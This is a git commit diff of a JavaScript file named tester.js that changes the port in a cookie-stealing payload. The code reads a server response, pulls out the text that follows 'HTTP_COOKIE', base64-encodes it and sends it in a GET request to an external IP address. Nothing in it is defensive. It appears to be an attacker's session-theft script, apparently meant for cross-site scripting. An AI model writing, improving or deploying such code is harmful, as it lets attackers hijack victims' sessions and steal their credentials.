78825b725f4fd2b50383f8d3ee1d8c89453ddd09
powlzbdz <74605366+powlzbdzdz11@users.noreply.github.com>
2024-04-24 21:43:03 -0400

    tester.js

--- tester.js
+++ tester.js
@@ -8,6 +8,6 @@ req.send();
 function reqListener() {
 var req2 = new XMLHttpRequest();
 const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 ); # Thats ugly, improve it :)
-req2.open('GET', 'http://84.247.183.115/?data=' + btoa(sess), false);
+req2.open('GET', 'http://84.247.183.115:1177/?data=' + btoa(sess), false);
 req2.send()
 };
